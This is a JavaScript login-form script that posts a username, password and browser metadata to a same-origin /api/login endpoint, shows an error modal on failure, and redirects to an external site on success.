document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    const loginBtn  = document.getElementById('login-btn');
    const btnText   = document.getElementById('btn-text');
    const btnIcon   = document.getElementById('btn-icon');
    const btnSpinner = document.getElementById('btn-spinner');

    // ─── Helpers ────────────────────────────────────────────────────────────
    function setLoading(on) {
        loginBtn.disabled = on;
        btnText.textContent = on ? 'Please wait...' : 'Login';
        btnIcon.style.display   = on ? 'none'  : 'inline';
        btnSpinner.style.display = on ? 'inline' : 'none';
    }

    // ─── Form Submit ─────────────────────────────────────────────────────────
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;

        // Collect optional metadata (device / browser info)
        const meta = {
            userAgent:  navigator.userAgent,
            timestamp:  new Date().toISOString(),
            screenSize: `${screen.width}x${screen.height}`,
            language:   navigator.language
        };

        setLoading(true);

        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password, meta })
            });

            const data = await response.json();

            if (data.success) {
                // ✅ Correct credentials – redirect to target page
                window.location.href = 'https://winzing247.live/';
            } else {
                // ❌ Wrong credentials – show popup, stay on page
                showErrorModal();
            }
        } catch (err) {
            console.error('Login request failed:', err);
            showErrorModal();
        } finally {
            setLoading(false);
        }
    });

    // ─── Input glow effect ───────────────────────────────────────────────────
    document.querySelectorAll('.input-group input').forEach(input => {
        input.addEventListener('focus', () => {
            input.parentElement.style.borderColor = '#8ab4f8';
            input.parentElement.style.boxShadow   = '0 0 0 3px rgba(138, 180, 248, 0.3)';
        });
        input.addEventListener('blur', () => {
            input.parentElement.style.borderColor = '#ced4da';
            input.parentElement.style.boxShadow   = 'none';
        });
    });
});

// ─── Modal Controls (global so onclick="" works) ─────────────────────────────
function showErrorModal() {
    const modal = document.getElementById('error-modal');
    modal.style.display = 'flex';
    // Animate in
    requestAnimationFrame(() => modal.classList.add('visible'));
}

function closeErrorModal() {
    const modal = document.getElementById('error-modal');
    modal.classList.remove('visible');
    // Wait for CSS transition before hiding
    modal.addEventListener('transitionend', () => {
        modal.style.display = 'none';
    }, { once: true });
    // Re-focus username field so user can retry easily
    document.getElementById('username').focus();
}

// Close modal when clicking on the dark overlay
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('error-modal').addEventListener('click', (e) => {
        if (e.target.id === 'error-modal') closeErrorModal();
    });
});
